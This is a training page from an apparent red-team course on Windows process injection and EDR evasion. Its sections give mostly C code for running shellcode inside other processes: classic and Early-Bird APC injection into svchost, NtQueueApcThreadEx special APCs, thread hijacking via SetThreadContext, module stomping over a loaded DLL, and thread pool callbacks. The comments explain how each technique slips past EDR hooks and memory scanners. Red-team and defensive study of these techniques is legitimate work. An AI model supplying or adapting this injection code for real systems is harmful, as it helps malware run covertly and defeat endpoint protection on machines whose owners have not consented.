---
layout: training-page
title: "APC & Thread Injection — Red Team Academy"
module: "Evasion"
tags:
  - apc
  - thread-injection
  - early-bird
  - process-injection
  - edr-bypass
page_key: "evasion-apc-injection"
render_with_liquid: false
---

# APC Injection & Thread Injection Techniques

Asynchronous Procedure Calls (APCs) allow code execution in the context of another thread without creating a new one. Early-Bird APC injection runs shellcode before the process's main entry point — before EDR's DLL injection. Additional techniques: NtQueueApcThread, thread hijacking, thread pool injection, and module stomping.

## Classic APC Injection

```
// APC injection: queue shellcode execution to an alertable thread
// Alertable threads: threads waiting in SleepEx, WaitForSingleObjectEx, etc.

#include <windows.h>

// 1. Find alertable thread in target process:
// (Many processes have alertable threads — svchost, explorer, etc.)
// Use CreateToolhelp32Snapshot to enumerate threads:
THREADENTRY32 te = { sizeof(te) };
HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
Thread32First(hSnap, &te);
while (Thread32Next(hSnap, &te)) {
    if (te.th32OwnerProcessID == targetPid) {
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
        // Queue APC to this thread
        QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, 0);
        CloseHandle(hThread);
    }
}

// 2. Allocate and write shellcode:
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
PVOID pShellcode = VirtualAllocEx(hProc, NULL, shellcodeSize,
    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, pShellcode, shellcode, shellcodeSize, NULL);

// 3. Queue APC pointing to shellcode:
// (Do this for multiple threads to increase chances of hitting alertable one)
QueueUserAPC((PAPCFUNC)pShellcode, hThread, NULL);
```

## Early-Bird APC Injection

```
// Early-Bird: inject into process before its entry point runs
// Shellcode executes before EDR loads its DLL into the process
// → No EDR hooks at time of execution

// Steps:
// 1. Create target process SUSPENDED:
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\svchost.exe", "-k netsvcs",
    NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Allocate + write shellcode:
PVOID pMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, pMem, shellcode, shellcodeSize, NULL);

// 3. Queue APC to main thread (suspended = guaranteed to drain APC queue):
QueueUserAPC((PAPCFUNC)pMem, pi.hThread, NULL);

// 4. Resume thread — APC fires IMMEDIATELY before entry point:
ResumeThread(pi.hThread);
// Shellcode runs → then normal process entry point

// Why it works:
// EDR's DLL injection callback (PsSetLoadImageNotifyRoutine) fires on ResumeThread
// But the APC is already queued → fires before EDR's hooks are installed
```

## NtQueueApcThreadEx (Shellcode APC)

```
// NtQueueApcThreadEx with APC type = SpecialUserApc
// Works on non-alertable threads (Windows 10+)
// SPECIAL_USER_APC forces execution regardless of alertable state

#define QUEUE_USER_APC_CALLBACK_DATA_CONTEXT 0x10000

typedef NTSTATUS(NTAPI* _NtQueueApcThreadEx)(
    HANDLE ThreadHandle,
    HANDLE ApcRoutine,  // or APC type flag
    PVOID ApcRoutine2,
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    PVOID SystemArgument3
);

// Load NtQueueApcThreadEx:
_NtQueueApcThreadEx NtQueueApcThreadEx = GetProcAddress(
    GetModuleHandleA("ntdll"), "NtQueueApcThreadEx");

// Queue special APC (fires on non-alertable threads too):
NtQueueApcThreadEx(
    hThread,
    (HANDLE)QUEUE_USER_APC_CALLBACK_DATA_CONTEXT,
    (PVOID)pShellcode,
    NULL, NULL, NULL
);
```

## Thread Hijacking (SetThreadContext)

```
// Suspend target thread, redirect RIP to shellcode, resume
// No new thread created — uses victim's existing thread

// 1. Open thread and suspend:
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
SuspendThread(hThread);

// 2. Get current context:
CONTEXT ctx = { CONTEXT_FULL };
GetThreadContext(hThread, &ctx);

// 3. Allocate shellcode in target process:
// (already done above — pShellcode in hProc)

// 4. Save original RIP, redirect to shellcode:
ULONGLONG origRip = ctx.Rip;
// Shellcode must restore original RIP when done (or crash)
ctx.Rip = (ULONGLONG)pShellcode;
SetThreadContext(hThread, &ctx);

// 5. Resume:
ResumeThread(hThread);
// Thread runs shellcode → if shellcode restores RIP → continues normally
```

## Module Stomping (DLL Hollowing)

```
// Module stomping: overwrite a loaded DLL's code section with shellcode
// The page is backed by a legitimate PE file on disk → bypasses unbacked memory checks

// 1. Force load a "sacrificial" DLL into target process:
HMODULE hStomped = LoadLibraryA("clbcatq.dll");  // rarely used DLL

// 2. Find its .text section:
PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hStomped;
PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hStomped + pDos->e_lfanew);
PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
PVOID textSection = (BYTE*)hStomped + pSec->VirtualAddress;

// 3. Overwrite with shellcode:
DWORD oldProt;
VirtualProtect(textSection, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(textSection, shellcode, shellcodeSize);
VirtualProtect(textSection, shellcodeSize, PAGE_EXECUTE_READ, &oldProt);

// 4. Execute from DLL's address space:
// Create thread at textSection, or jump to it

// Memory appears backed by clbcatq.dll → EDR sees legitimate module backing
```

## Thread Pool Injection

```
// Windows thread pool callbacks execute in pooled threads
// Queue work item to thread pool to execute shellcode

// RtlQueueWorkItem — queue callback to worker thread pool:
typedef NTSTATUS(NTAPI* _RtlQueueWorkItem)(
    LPTHREAD_START_ROUTINE Function,
    PVOID Context,
    ULONG Flags
);

_RtlQueueWorkItem RtlQueueWorkItem = GetProcAddress(
    GetModuleHandleA("ntdll"), "RtlQueueWorkItem");

RtlQueueWorkItem((LPTHREAD_START_ROUTINE)pShellcode, NULL, WT_EXECUTEDEFAULT);

// Or via TpAllocWork/TpPostWork (TP_POOL):
PTP_WORK work;
TpAllocWork(&work, (PTP_WORK_CALLBACK)pShellcode, NULL, NULL);
TpPostWork(work);
TpReleaseWork(work);
```

## Resources

- ired.team — `www.ired.team/offensive-security/code-injection-process-injection`
- Early Bird APC Injection — CyberArk research (2018)
- NtQueueApcThreadEx — MDSec blog
- Module Stomping — `github.com/forrest-orr/moneta` (memory analysis)
- Maldev Academy — injection techniques course
- ProcessInjection.cs — `github.com/3xpl01tc0d3r/ProcessInjection`
